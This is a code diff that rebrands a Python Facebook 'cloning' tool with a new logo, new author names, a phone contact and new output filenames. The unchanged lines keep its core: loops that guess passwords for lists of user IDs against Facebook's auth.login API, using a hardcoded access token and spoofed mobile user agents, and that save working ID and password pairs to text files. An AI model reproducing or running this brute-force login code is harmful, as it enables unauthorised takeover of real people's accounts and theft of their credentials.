@@ -388,22 +388,23 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""\033[1;32m
-       
-██╗░░░██╗███████╗░█████╗░██╗██████╗░
-██║░░░██║╚════██║██╔══██╗██║██╔══██╗
-██║░░░██║░░███╔═╝███████║██║██████╔╝
-██║░░░██║██╔══╝░░██╔══██║██║██╔══██╗
-╚██████╔╝███████╗██║░░██║██║██║░░██║
-░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝   \033
+  __  __    _       _ ___ ____  
+ |  \/  |  / \     | |_ _|  _ \ 
+ | |\/| | / _ \ _  | || || | | |
+ | |  | |/ ___ \ |_| || || |_| |
+ |_|  |_/_/   \_\___/|___|____/ 
+                                \033
 __________________×______________________
   
-  Auther   :  UZAIR MEHAR
+  Auther   :  MAJID KHAN 💖YASHIKA SARANG
  
-  Github   :  UZAIR-009
+  Github   :  MAJID KHAN 💝YASHIKA SARANG 
 
-  Facebook : ⭐⭐⭐⭐
+  Facebook :  MAJID HU YWR..⭐⭐⭐⭐
+
+  TEAM     : TRUSTED HEART SHUTERS 
   
-  Contact : 03407275127
+  Contact : +919050966900
 __________________×______________________\033[1;37m""")
 
 class Main:
@@ -419,17 +420,17 @@ class Main:
 		print(" [3] Create File")
 		print(" [4] 2009-10 Cloning")
 		print(" [5] 2011-14 Cloning")
-		print(" [E] Exit Programming\n")
-		UZAIR =input(" Choose : ")
-		if UZAIR in ["1", "01"]:
+		print(" [E] YASHIKA💘SAMAR new tool\n")
+		MAJID =input(" Choose : ")
+		if MAJID in ["1", "01"]:
 			File()
-		if UZAIR in ["2", "02"]:
+		if MAJID in ["2", "02"]:
 			Public()
-		if UZAIR in ["3", "03"]:
+		if MAJID in ["3", "03"]:
 			os.system("python Dump.py")
-		if UZAIR in ["4", "04"]:
+		if MAJID in ["4", "04"]:
 			self.old()
-		if UZAIR in ["5", "05"]:
+		if MAJID in ["5", "05"]:
 			self.old2()
 			exit()
 		else:
@@ -832,7 +833,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ UZAIR ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ SAMAR💘YASHIKA] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -849,15 +850,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ UZAIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[SAMAR💘YASHIKA-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-UZAIR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-SAMAR💘YASHIKA-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ UZAIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ SAMAR💘YASHIKA-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-UZAIR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-SAMAR💘YASHIKA-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1259,7 +1260,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [UZAIR ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [YASHIKA💘SAMAR] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1276,15 +1277,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ UZAIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[YASHIKA💘SAMAR-OK] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-UZAIR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-YASHIKA💘SAMAR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ UZAIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[YASHIKA💘SAMAR-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-UZAIR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-YASHIKA💘SAMAR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
